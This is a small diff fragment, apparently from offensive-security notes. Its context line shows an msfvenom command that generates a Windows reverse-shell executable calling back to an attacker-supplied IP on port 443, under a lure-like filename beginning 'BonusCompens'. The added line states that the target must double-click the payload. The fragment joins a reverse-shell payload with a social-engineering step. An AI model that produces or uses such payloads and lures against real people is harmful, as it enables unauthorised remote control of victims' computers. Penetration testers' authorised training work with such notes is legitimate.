@@ -63,3 +63,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > BonusCompens
 
 ---
 
+#### Target needs to double click the payload once created on their machine
